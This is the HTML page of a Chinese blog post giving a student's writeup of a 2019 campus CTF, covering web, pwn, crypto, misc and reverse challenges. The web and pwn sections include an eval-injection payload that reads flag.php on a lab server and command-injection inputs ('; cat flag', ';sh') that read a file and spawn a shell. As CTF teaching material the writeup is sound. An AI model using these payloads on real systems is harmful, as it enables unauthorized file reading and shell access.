@@ -1,0 +1,130 @@
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="chrome=1"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><link rel=prev href=https://blog.batkiz.com/2018/12/31/using-scoop/><link rel=next href=https://blog.batkiz.com/2019/04/28/advice-to-new-programmers/><link rel=canonical href=https://blog.batkiz.com/2019/04/19/xatuctf2019-wp/><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"><title>xatuctf2019 校赛 writeup | not b@tk1z</title><meta name=title content="xatuctf2019 校赛 writeup | not b@tk1z"><link rel=stylesheet href=/font/iconfont.css><link rel=stylesheet href=/css/main.min.css><meta name=twitter:card content="summary"><meta name=twitter:title content="xatuctf2019 校赛 writeup"><meta name=twitter:description content="代打出题人"><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"xatuctf2019 校赛 writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/blog.batkiz.com\/2019\/04\/19\/xatuctf2019-wp\/"},"image":{"@type":"ImageObject","url":"https:\/\/blog.batkiz.com\/cover.png","width":800,"height":600},"genre":"posts","keywords":"ctf","wordcount":1126,"url":"https:\/\/blog.batkiz.com\/2019\/04\/19\/xatuctf2019-wp\/","datePublished":"2019-04-19T21:57:00\x2b00:00","dateModified":"2019-04-19T21:57:00\x2b00:00","publisher":{"@type":"Organization","name":"batkiz","logo":{"@type":"ImageObject","url":"https:\/\/blog.batkiz.com\/logo.png","width":127,"height":40}},"author":{"@type":"Person","name":"batkiz"},"description":"代打出题人"}</script></head><body><div class=wrapper><nav class=navbar><div class=container><div class="navbar-header header-logo"><a href=https://blog.batkiz.com/>not b@tk1z</a></div><div class="menu navbar-right"><a class=menu-item href=/posts/>Posts</a>
+<a class=menu-item href=/tags/>Tags</a>
+<a class=menu-item href=/about>About</a>
+<a class=menu-item href=/atom.xml>RSS</a>
+<a href=javascript:void(0); class=theme-switch><i class="iconfont icon-sun"></i></a>&nbsp;</div></div></nav><nav class=navbar-mobile id=nav-mobile style=display:none><div class=container><div class=navbar-header><div><a href=javascript:void(0); class=theme-switch><i class="iconfont icon-sun"></i></a>&nbsp;<a href=https://blog.batkiz.com/>not b@tk1z</a></div><div class=menu-toggle><span></span><span></span><span></span></div></div><div class=menu id=mobile-menu><a class=menu-item href=/posts/>Posts</a>
+<a class=menu-item href=/tags/>Tags</a>
+<a class=menu-item href=/about>About</a>
+<a class=menu-item href=/atom.xml>RSS</a></div></div></nav><main class=main><div class=container><article class=post-warp><header class=post-header><h1 class=post-title>xatuctf2019 校赛 writeup</h1><div class=post-meta>by <a href=https://blog.batkiz.com/ rel=author>batkiz</a>
+<span class=post-time>on <time datetime=2019-04-19>19 April 2019</time></span></div></header><div class=post-content><p>2019.4.14 校赛，由于之前没办萌新赛，所以这次的题有点水23333</p><h2 id=web>WEB</h2><h3 id=你能读到flag吗>你能读到flag吗</h3><p>题目：</p><pre><code class=language-php> &lt;?php
+error_reporting(0);
+show_source(__FILE__);
+
+$a = @$_REQUEST['hello'];
+eval(&quot;var_dump($a);&quot;);?&gt;
+</code></pre><p><del>谷歌之，原题，直接复制提交。</del></p><p>使用 <code>file_get_contents()</code> 方法获得 flag</p><p>python 代码如下</p><pre><code class=language-python>import requests
+
+s=requests.session()
+body = {&quot;hello&quot;:&quot;file_get_contents('flag.php')&quot;}
+r = s.post(&quot;http://192.168.1.5:23114/read.php&quot;, data=body)
+
+print(r.content)
+</code></pre><h3 id=phpdecode>phpdecode</h3><p><del>直接搜 <code>1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=</code> 找到了别人的 wp，flag 获得。</del></p><pre><code class=language-php>1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY= &lt;?php
+
+error_reporting(0);
+require __DIR__.'/lib.php';
+
+echo base64_encode(hex2bin(strrev(bin2hex($flag)))), '&lt;hr&gt;';
+
+highlight_file(__FILE__);?&gt;
+</code></pre><p>可知加密为 <code>base64_encode(hex2bin(strrev(bin2hex($flag))))</code>，一层一层解密，python 脚本如下</p><pre><code class=language-python>from base64 import b64decode
+from binascii import hexlify, unhexlify
+
+code = &quot;1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=&quot;
+
+print(unhexlify(hexlify(b64decode(code))[::-1]))
+</code></pre><h2 id=pwn>PWN</h2><h3 id=nc-from-0-to-1>nc from 0 to 1</h3><p>直接 nc 连接即可获得 flag</p><h3 id=ls1>ls1</h3><p>ls as a service，将输入的字符传递为 ls 的 args，多试几次即可得出文件目录结构，精简后的如下：</p><pre><code class=language-bash>.
+├── bin
+│   ├── cat
+│   ├── ls
+│   └── sh
+├── flag
+└── ls1
+</code></pre><p>传入 <code>; cat flag</code> 即可读到<figure><img src=/images/ring.svg data-sizes=auto data-src=https://s2.ax1x.com/2019/04/19/E92wlT.png alt=ls1 class=lazyload><figcaption class=image-caption>ls1</figcaption></figure></p><h3 id=ls2>ls2</h3><p>ls as a service v2，限制了传入 args 的字符数为 3，无法直接 <code>cat flag</code>。
+由于 <code>bin</code> 下存在 <code>sh</code>，通过 <code>;sh</code> 唤起 shell，读取flag。</p><p><figure><img src=/images/ring.svg data-sizes=auto data-src=https://s2.ax1x.com/2019/04/19/E9206U.png alt=ls2 class=lazyload><figcaption class=image-caption>ls2</figcaption></figure></p><h2 id=crypto>CRYPTO</h2><h3 id=dididi>dididi</h3><p><code>..-. .-.. .- --. ..-. -.. ....- .---- . .---- ..--- -.. ----- ...-- .---- -.-. ..--- . -.. -.... -.-. ..-. ---.. ---.. ---.. -.... ...-- ---.. . -.... -.... -... . ....- -.. .</code></p><p>摩斯密码</p><h3 id=caesar-cipher>Caesar cipher</h3><p><code>kqfl{Hfjxfw_hnumjw_1x_xt_xnruqj}</code></p><p>凯撒加密</p><h3 id=rc4>rc4</h3><pre><code class=language-txt>cipher:wRTwnbjEAf6T22dYzyKgtBzQ/ydMmNqmf3WeW9E=
+key:eGF0dXNlYw==
+</code></pre><p><a href=http://ctf.ssleye.com/rc4.html rel="nofollow noreferrer" target=_blank>rc4 加密</a>，唯一需要注意的是 key 可能需要经过一次 base64 解密。</p><h3 id=datababy>Datababy</h3><p>数码宝贝中的字母表，对照即可。</p><p>（由此题可以知道出题人没再手动复现题，因为 datababy 并不能搜到数码宝贝。其官方英文名称为 <em>Digital monster</em> 。</p><h3 id=baby-rsa>baby RSA</h3><p>与下面的 esayRSA 相同，用现成的库就好</p><h3 id=110>110</h3><p>ONE -&gt; 1
+ZERO -&gt; 0
+得到一长长长长长长长长长长长长长长长长长长长长长串 0 和 1。</p><p>每八位二进制转 ASCII 即可获得 flag。</p><h3 id=easy-rsa>easy RSA</h3><pre><code class=language-txt>n = 9637828843823500407917687664441327784714605952794831018467094508166140790258515855681653788687192363262499178812675284846293988948568322307302995971433129
+e = 65537
+c = 1736476276571471518318904802453151397043836796931780608028216447791913603812271065838523639504410549594365173220377575243217983329182149750696526310732151
+</code></pre><p><a href=https://github.com/3summer/CTF-RSA-tool rel="nofollow noreferrer" target=_blank>https://github.com/3summer/CTF-RSA-tool</a></p><h2 id=misc>MISC</h2><h3 id=这个容易-就是有点累>这个容易，就是有点累</h3><p>一个压缩了几千层的 zip 包，可以直接上十六进制查看器(winhex, hxd, 010 editor等)打开，Ctrl + F flag 即可得到。</p><p>据写脚本解压的小伙伴称他们跑了一个多小时（</p><p>压缩脚本如下</p><pre><code class=language-sh>#!/bin/bash
+
+name1=`cat /dev/urandom | sed 's/[^a-zA-Z0-9]//g' | strings -n 6 | head -n 1`
+name2=&quot;.zip&quot;
+name=$name1$name2
+#echo $name
+
+zip -m $name flag
+
+while true
+do
+ name1=`cat /dev/urandom | sed 's/[^a-zA-Z0-9]//g' | strings -n 6 | head -n 1`
+ name=$name1$name2
+ zip -m $name *.zip
+done
+</code></pre><h3 id=fibs>Fibs</h3><p>求斐波那契数列第 1234 项，然后 md5(hex(Fibs(1234)))，（转小写后）即为 flag。</p><p>看到这个题……肯定不能自己现场写算法，否则会被跑炸内存的。直接谷歌斐波那契数列快速求第 N 项，得到 O(log N) 的算法后写脚本求项。</p><p>脚本如下</p><pre><code class=language-py>def Fibonacci_recursion_fast(n):
+    if n == 0:
+        return 0
+    if n == 1:
+        return 1
+    k = (n + 1) / 2 if n % 2 else n / 2
+    fib_k = Fibonacci_recursion_fast(k)
+    fib_k_1 = Fibonacci_recursion_fast(k - 1)
+    return fib_k**2 + fib_k_1**2 if n % 2 else (2 * fib_k_1 + fib_k) * fib_k
+
+print(hex(Fibonacci_recursion_fast(1234)))
+</code></pre><p>md5 一下，再转小写提交。</p><h2 id=reverse>REVERSE</h2><h3 id=snake>Snake</h3><p>贪吃蛇，玩到 70 分就出 flag</p><h3 id=ssta-s-python-教室>ssta&rsquo;s Python 教室</h3><p>给的是一个 pyc 文件，在线反编译，得到的代码如下。</p><pre><code class=language-py># encoding: utf-8
+
+from base64 import b32encode
+import codecs
+
+def b32(s):
+    return b32encode(s)
+
+def rot13(s):
+    return codecs.encode(s, 'rot13')
+    # return s.encode('rot13')
+
+def reverse(s):
+    return s[::-1]
+
+def reverseSomeByte(s):
+    return s[-6:] + s[:-6]
+
+def main():
+    flag = '******************************'
+    cipher = reverse(b32(rot13(reverseSomeByte(flag))))
+    print(cipher)
+    print('=== WELCOME TO XATUCTF2019 ===')
+    return 'C336VYBGQB56FX5LGLM6FX5MFDNGGTZMGTP4D7MPUT3SXZVP6RP4TQQN'
+
+if __name__ == '__main__':
+    ffllaagg = main()
+    print('FLAG is right here. Can you get it?', ffllaagg)
+</code></pre><p>重点是 <code>cipher = reverse(b32(rot13(reverseSomeByte(flag))))</code>，与 phpencode 相似，自己写脚本一层一层解密即可。
+自己写的不完善的脚本如下</p><pre><code class=language-py># -*- encoding: utf-8 -*-
+from base64 import b32decode
+import codecs
+
+def b32(s):
+    return b32decode(s)
+
+def rot13(s):
+    return codecs.decode(s, 'rot13')
+
+def reverse(s):
+    return s[::-1]
+
+cipher = 'C336VYBGQB56FX5LGLM6FX5MFDNGGTZMGTP4D7MPUT3SXZVP6RP4TQQN'
+
+print(rot13(b32(reverse(cipher)).decode(&quot;ASCII&quot;)))
+</code></pre><p>前六位移到最后即可。</p><hr><p>自己没做出来的题就没写 wp 23333</p></div><div class=post-copyright><p class=copyright-item><span>Author:</span>
+<span>batkiz</span></p><p class=copyright-item></p><p class=copyright-item><span>LICENSE:</span>
+<span>如无特殊说明，本博客文章均以 <a href=https://creativecommons.org/licenses/by-nc-sa/4.0/ target=_blank>CC BY-NC-SA 4.0</a> 协议发布</span></p></div><div class=post-tags><section><i class="iconfont icon-icon-tag"></i>Tag:
+<span class=tag><a href=https://blog.batkiz.com/tags/ctf/>#ctf</a></span></section><section><a href=javascript:window.history.back();>Back</a></span> ·
+<span><a href=https://blog.batkiz.com/>Home</a></span></section></div><div class=post-nav><a href=https://blog.batkiz.com/2018/12/31/using-scoop/ class=prev rel=prev title="初探 Scoop"><i class="iconfont icon-dajiantou"></i>&nbsp;初探 Scoop</a>
+<a href=https://blog.batkiz.com/2019/04/28/advice-to-new-programmers/ class=next rel=next title="翻译 | 给新手程序员们的建议">翻译 | 给新手程序员们的建议&nbsp;<i class="iconfont icon-xiaojiantou"></i></a></div><div class=post-comment></div></article></div></main><footer class=footer><div class=copyright>&copy;
+<span itemprop=copyrightYear>2017 - 2019</span>
+<span class=author itemprop=copyrightHolder><a href=https://blog.batkiz.com/>batkiz</a> |</span>
+<span>powered by <a href=https://gohugo.io/ target=_blank rel="external nofollow noopener noreffer">Hugo</a> & <a href=https://github.com/batkiz/left target=_blank rel="external nofollow noopener noreffer">left</a></span></div></footer><link href=//lib.baomitu.com/lightgallery/1.6.12/css/lightgallery.min.css rel=stylesheet><script src=/js/vendor_gallery.min.js async></script><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-111900041-1','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><script type=text/javascript async src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">MathJax.Hub.Config({"HTML-CSS":{preferredFont:"TeX",availableFonts:["STIX","TeX"],linebreaks:{automatic:true},EqnChunk:(MathJax.Hub.Browser.isMobile?10:50)},tex2jax:{inlineMath:[["$","$"],["\\(","\\)"]],processEscapes:true,ignoreClass:"tex2jax_ignore|dno",skipTags:['script','noscript','style','textarea','pre','code']},TeX:{noUndefined:{attributes:{mathcolor:"red",mathbackground:"#FFEEEE",mathsize:"90%"}},Macros:{href:"{}"}},messageStyle:"none"});MathJax.Hub.Queue(function(){var all=MathJax.Hub.getAllJax(),i;for(i=0;i<all.length;i+=1){all[i].SourceElement().parentNode.className+=' has-jax';}});</script><style>code.has-jax{font:inherit;font-size:100%;background:inherit;border:inherit;color:#515151}</style><link href=https://cdn.bootcss.com/highlight.js/9.15.10/styles/atom-one-dark.min.css rel=stylesheet><script src=https://cdn.bootcss.com/highlight.js/9.15.10/highlight.min.js></script><script>hljs.initHighlightingOnLoad();</script></div></body></html>
